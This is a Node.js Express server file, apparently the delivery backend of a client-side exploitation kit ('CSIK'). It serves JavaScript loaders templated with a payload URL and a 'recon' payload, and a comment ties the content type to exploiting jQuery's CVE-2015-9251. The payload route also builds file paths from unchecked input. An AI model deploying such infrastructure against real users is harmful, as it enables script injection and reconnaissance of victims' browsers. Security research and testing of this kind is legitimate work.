import express from 'express'
import { resolve } from 'path'
import ld from 'lodash'
import cors from 'cors'
import listDir from './lib/listDir.js'

const app = express()
const port = 3000

let loaders = () => { console.log('Not ready') }

loadLoaders().then((loaderGetter) => {
  loaders = loaderGetter
})

const payloadUrl = 'http://localhost:3000/payload/recon'

app.use(cors())

app.get('/loaders', (req, res) => {
  return res.json(loaders.list())
})

app.get('/loaders/:loader', (req, res) => {
    // May need to be text/javascript for CVE-2015-9251
    res.set('Content-Type', 'application/javascript')
    return res.send(
      loaders.get(req.params.loader).script({ PAYLOAD_URL: payloadUrl })
    )
})

app.get('/payload/:payload', (req, res) => {
  res.sendFile(resolve('./payloads/' + req.params.payload + '.js'))
})

app.listen(port, () => console.log(`CSIK Server listening on port ${port}!`))

async function loadLoaders() {
  let loaders = await listDir(resolve('./loaders/'))
  let loaderMap = {}
  while(loaders.length > 0) {
    let loader = loaders.shift()
    ld.set(loaderMap, ld.trimEnd(loader, '.js'), await import(`./loaders/${loader}`))
  }
  return {
      get: (key) => {
      return loaderMap[key] ? loaderMap[key].default : 'Not a loader'
      },
      list: () => {
        return Object.keys(loaderMap)
      }
  }
}